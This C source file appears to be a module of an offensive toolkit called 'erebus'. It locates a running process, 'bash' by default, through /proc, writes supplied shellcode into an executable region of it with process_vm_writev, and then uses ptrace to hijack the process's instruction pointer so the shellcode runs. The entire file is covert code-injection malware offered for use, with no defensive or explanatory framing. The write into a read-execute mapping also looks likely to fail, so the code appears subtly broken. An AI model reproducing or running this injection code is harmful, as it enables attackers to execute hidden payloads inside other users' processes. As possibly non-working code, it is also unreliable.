#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/user.h>
#include "../../include/injection.h"

#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS "bash"
#endif

/* Walk /proc and return the PID of the first process whose comm matches name. */
static pid_t _find_process(const char *name)
{
    DIR *d = opendir("/proc");
    if (!d) return -1;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_type != DT_DIR) continue;
        char *end;
        long pid = strtol(ent->d_name, &end, 10);
        if (*end != '\0' || pid <= 1) continue;

        char path[64];
        snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;

        char comm[256] = {0};
        if (fgets(comm, sizeof(comm), f)) {
            size_t l = strlen(comm);
            if (l > 0 && comm[l - 1] == '\n') comm[l - 1] = '\0';
        }
        fclose(f);

        if (strcmp(comm, name) == 0) {
            closedir(d);
            return (pid_t)pid;
        }
    }
    closedir(d);
    return -1;
}

/*
 * Find the first r-xp region in the target process large enough for sc_len.
 * Returns the start address or 0 on failure.
 */
static unsigned long _find_rx_region(pid_t pid, size_t min_size)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) return 0;

    char line[256];
    unsigned long start = 0, end = 0;
    char perms[8];
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%lx-%lx %7s", &start, &end, perms) != 3) continue;
        /* r-xp: readable and executable, private mapping */
        if (perms[0] == 'r' && perms[1] == '-' && perms[2] == 'x' &&
            (end - start) >= min_size) {
            fclose(f);
            return start;
        }
    }
    fclose(f);
    return 0;
}

/*
 * Inject shellcode into a remote process via process_vm_writev, then
 * hijack execution with ptrace.
 *
 * Note: process_vm_writev requires CAP_SYS_PTRACE or a matching UID on
 * modern kernels with Yama ptrace_scope = 1.  Use ptrace_inject for
 * a single-syscall alternative when this is restricted.
 */
void erebus_process_vm(const unsigned char *sc, size_t sc_len)
{
    pid_t pid = _find_process(CONFIG_TARGET_PROCESS);
    if (pid < 0) return;

    unsigned long remote_addr = _find_rx_region(pid, sc_len);
    if (!remote_addr) return;

    struct iovec local  = { .iov_base = (void *)sc,           .iov_len = sc_len };
    struct iovec remote = { .iov_base = (void *)remote_addr,  .iov_len = sc_len };

    if (process_vm_writev(pid, &local, 1, &remote, 1, 0) != (ssize_t)sc_len)
        return;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) return;
    waitpid(pid, NULL, 0);

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return;
    }

#if defined(__x86_64__)
    regs.rip = (unsigned long long)remote_addr;
#elif defined(__i386__)
    regs.eip = (unsigned long)remote_addr;
#elif defined(__aarch64__)
    regs.pc  = (unsigned long long)remote_addr;
#elif defined(__arm__)
    regs.uregs[15] = (unsigned long)remote_addr; /* PC */
#endif

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}
